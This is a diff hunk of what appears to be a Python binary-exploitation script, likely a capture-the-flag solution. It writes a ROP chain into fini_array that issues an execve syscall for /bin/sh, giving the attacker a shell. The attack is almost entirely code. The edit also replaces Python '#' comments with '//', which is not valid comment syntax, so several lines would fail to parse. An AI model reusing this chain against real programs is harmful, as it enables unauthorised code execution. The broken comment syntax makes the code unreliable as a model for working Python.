@@ -105,15 +105,25 @@ write_val(fini_array, p64(libc_csu) + p64(main_addr))
 //Write ROP chain to memory
 
 print("[*] Writing ROP chain to memory...")
+
 write_val(fini_array + 16, p64(pop_rdi))
-write_val(fini_array + 24, p64(fini_array + 88)) # Pointer to /bin/sh string
+
+write_val(fini_array + 24, p64(fini_array + 88)) // Pointer to /bin/sh string
+
 write_val(fini_array + 32, p64(pop_rsi))
-write_val(fini_array + 40, p64(0))               
+
+write_val(fini_array + 40, p64(0))  
+
 write_val(fini_array + 48, p64(pop_rdx))
-write_val(fini_array + 56, p64(0))               
+
+write_val(fini_array + 56, p64(0))  
+
 write_val(fini_array + 64, p64(pop_rax))
-write_val(fini_array + 72, p64(59))              # execve syscall (0x3b)
-write_val(fini_array + 80, p64(syscall))         
+
+write_val(fini_array + 72, p64(59))  #// execve syscall (0x3b)
+
+write_val(fini_array + 80, p64(syscall))     
+
 write_val(fini_array + 88, b"/bin/sh\x00")       
 
 //Stack Pivot
